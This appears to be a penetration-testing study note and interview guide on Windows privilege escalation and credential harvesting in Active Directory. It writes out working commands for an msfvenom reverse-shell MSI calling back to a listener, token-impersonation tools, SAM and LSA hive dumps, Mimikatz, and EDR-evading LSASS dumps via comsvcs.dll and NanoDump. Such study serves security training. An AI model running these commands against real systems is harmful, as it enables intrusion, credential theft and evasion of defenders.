---
tags: [vapt, methodology, active-directory, interview, master-guide]
difficulty: expert
module: "Ultimate VAPT Master Guides - AD"
topic: "Master Guide - AD VAPT 02"
---

# AD VAPT 02 - Credential Harvesting and Local Privilege Escalation

## Introduction
Once an initial foothold is established on a domain-joined machine via phishing, exploitation, or credential reuse, the attacker usually lands in an unprivileged context (e.g., standard domain user). Before moving laterally, the attacker must escalate privileges locally to `SYSTEM` or a `Local Administrator` account. This unlocks the ability to dump memory, extract highly sensitive credentials (like NTLM hashes and Kerberos tickets), and execute commands with supreme authority on the host.

## Interview Strategy: Host-to-Domain Pivot
When discussing Local Privilege Escalation (LPE) in the context of Active Directory, your answer needs to bridge the gap between a single compromised host and the wider domain.

**The Expert's Pitch:**
> *"When I land an unprivileged shell on a domain-joined machine, my first priority is situational awareness without triggering EDR. I'll use tools like Seatbelt or native WMI queries to check for misconfigurations like Unquoted Service Paths, AlwaysInstallElevated registry keys, or vulnerable third-party services. 
> Once I exploit one of these to achieve `SYSTEM` privileges, my focus immediately shifts to Credential Harvesting. I will look to extract the SAM database, LSA secrets, and DPAPI keys. More importantly, I will dump the LSASS process memory. However, to maintain OPSEC against modern EDRs, I avoid standard Mimikatz execution. Instead, I'll use techniques like `comsvcs.dll` minidumps or tools like NanoDump to extract LSASS cleanly, then parse the dump offline on my attacking machine to extract cleartext passwords, NTLM hashes, or Kerberos TGTs to facilitate Lateral Movement."*

## Phase 1: Local Privilege Escalation (LPE) Methodologies

LPE on Windows generally falls into three categories: Misconfigurations, Token Impersonation, and Kernel Exploits.

### 1. Windows Host Enumeration
Automated enumeration scripts save immense time but generate noise.
*   **WinPEAS:** Extensive automated LPE discovery (High noise).
*   **Seatbelt (GhostPack):** Highly targeted, C# based, built for OPSEC.

**Execution (Seatbelt in memory):**
```powershell
execute-assembly Seatbelt.exe -group=system
```

### 2. Unquoted Service Paths
If a service executable path is not wrapped in quotes and contains spaces, Windows will attempt to execute every word before the space as a `.exe`.
*Example Path:* `C:\Program Files\Enterprise App\service.exe`
*Execution Order:*
1. `C:\Program.exe`
2. `C:\Program Files\Enterprise.exe`
3. `C:\Program Files\Enterprise App\service.exe`

**Exploitation:**
If the attacker has write permissions to `C:\`, they can place a malicious executable named `Program.exe`. Upon service restart (or system reboot), `Program.exe` executes as `SYSTEM`.

### 3. AlwaysInstallElevated
If the `AlwaysInstallElevated` policy is enabled in both `HKCU` and `HKLM`, any user can install `.msi` files with `SYSTEM` privileges.

**Check:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploitation:**
Generate a reverse shell `.msi` payload with msfvenom and install it.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o reverse.msi
```
```cmd
msiexec /quiet /qn /i reverse.msi
```

### 4. Token Impersonation (SeImpersonatePrivilege)
If the compromised user (often service accounts like IIS or MSSQL) holds `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, the attacker can coerce a high-privileged process to authenticate to them, capture the token, and impersonate it.

**Tools:** `PrintSpoofer`, `GodPotato`, `RoguePotato`

**Execution:**
```cmd
PrintSpoofer.exe -i -c cmd.exe
```

---

## Phase 2: Credential Harvesting and Memory Abuse

Once `SYSTEM` is achieved, the host becomes a goldmine for domain credentials.

### 1. Dumping the SAM and LSA Secrets
The SAM (Security Account Manager) stores local hashes. LSA Secrets store cleartext passwords for services, scheduled tasks, and sometimes the machine account password.

**Execution (Native registry dump):**
```cmd
reg save HKLM\sam sam.save
reg save HKLM\system system.save
reg save HKLM\security security.save
```
Extract offline using `secretsdump.py`:
```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

### 2. Dumping LSASS (Local Security Authority Subsystem Service)
LSASS manages authentication and stores credentials (cleartext, NTLM, Kerberos tickets) in memory for active logon sessions.

**Traditional Method (Mimikatz - High Detection):**
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**OPSEC Safe Method 1: Built-in comsvcs.dll**
Windows includes a native DLL that can create memory dumps. This avoids uploading external tools.
```cmd
# 1. Find LSASS PID
tasklist /fi "imagename eq lsass.exe"

# 2. Use rundll32 and comsvcs.dll to trigger MiniDumpW (Requires SYSTEM)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```

**OPSEC Safe Method 2: NanoDump**
NanoDump uses Syscalls and advanced evasion techniques to dump LSASS without triggering API hooks placed by EDRs.
```cmd
nanodump.exe --write C:\Temp\lsass.dmp
```

**Offline Parsing (On Attacker Machine):**
```bash
pypykatz lsa minidump lsass.dmp
```

---

## Custom ASCII Attack Diagram

```text
  [Low Priv Domain User Shell] (Compromised via Phishing)
               |
               v
      (1) Seatbelt.exe / WinPEAS (Enum Phase)
               |
               v
  [Identified: SeImpersonatePrivilege on IIS Account]
               |
               v
      (2) Execute GodPotato / PrintSpoofer
               |
               v
         [SYSTEM Privileges Achieved!]
               |
               v
      (3) tasklist -> Identify LSASS PID (e.g., 672)
               |
               v
      (4) rundll32 comsvcs.dll, MiniDump 672 lsass.dmp full
               |
               v
      (5) Download lsass.dmp to Attacker Machine
               |
               v
      (6) Parse with pypykatz/Mimikatz Offline
               |
               v
   [Extracted: Domain Admin NTLM Hash & Kerberos TGT]
```

---

## Real-World Attack Scenario

**The Setup:** The attacker bypassed the external perimeter by exploiting an SQL injection in a custom web application, giving them a command shell as the `NT AUTHORITY\NETWORK SERVICE` account on an IIS Web Server.
**The Execution:**
1. Running `whoami /priv`, the attacker noted `SeImpersonatePrivilege` was enabled.
2. The attacker uploaded `PrintSpoofer.exe` to a writable directory (`C:\Windows\Temp\`).
3. Running `PrintSpoofer.exe -c cmd.exe` immediately granted an interactive `NT AUTHORITY\SYSTEM` shell.
4. Knowing the server was heavily monitored by CrowdStrike EDR, the attacker avoided dropping `Mimikatz.exe`.
5. Instead, they utilized the native `comsvcs.dll` trick to dump the LSASS process to disk.
6. The attacker downloaded the `.dmp` file and parsed it locally on their Kali Linux machine using `pypykatz`.
7. Because a Domain Admin had logged into this web server via RDP the previous day, their NTLM hash was still resident in memory, giving the attacker keys to the entire domain.

## Chaining Opportunities
*   **LPE to Pass-the-Hash (PtH):** Once NTLM hashes are extracted from LSASS, they can be directly used in `NetExec` or `Impacket` to authenticate to other machines without ever needing to crack the hash into cleartext. (See [[Master Guide - AD VAPT 03]])
*   **LPE to Pass-the-Ticket (PtT):** Extracting `.kirbi` Kerberos tickets allows the attacker to inject them into their own session, bypassing NTLM authentication entirely.
*   **DPAPI Extraction:** With `SYSTEM` access, the attacker can extract DPAPI master keys, unlocking Chrome passwords, saved RDP credentials, and VPN profiles.

## Related Notes
*   [[Master Guide - AD VAPT 01]] - Initial Breach and AD Enumeration Methodology
*   [[Master Guide - AD VAPT 03]] - Exploiting NTLM Relays and Kerberos Flaws
*   [[Windows Privilege Escalation Techniques]]
*   [[Bypassing EDR and AV Hooks]]

---
**End of File**
